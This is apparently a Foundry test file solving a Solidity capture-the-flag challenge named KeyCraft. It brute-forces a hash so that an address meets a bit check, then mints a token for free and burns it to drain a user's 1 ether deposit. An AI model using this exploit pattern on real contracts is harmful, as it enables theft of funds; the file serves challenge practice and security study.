// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import {Test} from "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/KeyCraft.sol";

contract KC is Test {
    KeyCraft k;
    address owner;
    address user;
    address attacker;

    function setUp() public {
        owner = makeAddr("owner");
        user = makeAddr("user");

        vm.deal(user, 1 ether);

        vm.startPrank(owner);
        k = new KeyCraft("KeyCraft", "KC");
        vm.stopPrank();

        vm.startPrank(user);
        k.mint{value: 1 ether}(hex"dead");
        vm.stopPrank();
    }

    function test_KeyCraft() public {
        // vm.startPrank(attacker);
        // //Solution
        // k.mint(data);
        // vm.stopPrank();
        // assertEq(attacker.balance, 1 ether);

        uint256 i;
        uint160 h;
        while (true) {
            h = uint160(uint256(keccak256(abi.encodePacked(i))));
            
            if (uint16(h >> 108) == 13057) break;
            i++;
        }
        console.log("value of h: ", h);
        console.log("i value is : ",i);
        bytes memory attackBytes = abi.encodePacked(i);
        attacker = address(h);

        vm.startPrank(attacker);

        //Solution
        k.mint(attackBytes); // free mint, token id 2
        k.burn(2); // burn it and receive 1 ether

        vm.stopPrank();
        assertEq(attacker.balance, 1 ether);
    }
}
